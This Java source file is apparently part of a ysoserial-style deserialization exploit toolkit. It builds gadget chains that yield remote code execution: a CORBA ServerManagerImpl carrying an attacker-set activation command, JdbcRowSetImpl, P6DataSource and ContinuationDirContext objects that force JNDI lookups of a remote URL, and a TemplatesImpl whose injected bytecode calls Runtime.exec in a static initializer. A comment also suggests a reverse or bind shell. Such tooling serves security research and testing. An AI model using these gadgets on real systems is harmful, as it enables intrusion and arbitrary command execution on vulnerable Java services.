package gadgetFragment;

import com.p6spy.engine.spy.P6DataSource;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.rowset.JdbcRowSetImpl;
import com.zaxxer.hikari.HikariDataSource;
import com.zaxxer.hikari.hibernate.HikariConnectionProvider;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.python.antlr.ast.Str;
import util.ClassFiles;
import util.Reflections;
import util.Utils;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.Hashtable;

import static util.Reflections.setFieldValue;

public class InvokeChainedFragment {
    public static Object getSML(String command) throws Exception {
        ServerManagerImpl serverManager = Reflections.createWithObjectNoArgsConstructor(ServerManagerImpl.class);
        HashMap<Integer, ServerTableEntry> hashMap =new HashMap<>();
        ServerTableEntry serverTableEntry = Reflections.createWithObjectNoArgsConstructor(ServerTableEntry.class);
        hashMap.put(1,serverTableEntry);
        Reflections.setFieldValue(serverTableEntry, "state",2);
        Reflections.setFieldValue(serverTableEntry, "activateRetryCount",0);
        Reflections.setFieldValue(serverTableEntry, "debug", false);
        Reflections.setFieldValue(serverTableEntry, "activationCmd", command);

        Object process = Reflections.createWithObjectNoArgsConstructor(Class.forName("java.lang.UNIXProcess"));
        Reflections.setFieldValue(process, "hasExited", true);
        Reflections.setFieldValue(serverTableEntry, "process", process);

        Reflections.setFieldValue(serverManager, "serverTable", hashMap);
        return serverManager;
    }

    public static Object getJRS(String jndiURL) throws SQLException {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiURL);
        return jdbcRowSet;
    }

    public static Object getP6s(String jndiURL) throws Exception {
        P6DataSource p6DataSource = new P6DataSource();
        Reflections.setFieldValue(p6DataSource, "rdsName", jndiURL);
        return p6DataSource;
    }

    public static Object getCCT(String url) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Evil", "Evil", url));

        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        return ctx;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Utils.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Utils.Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


}
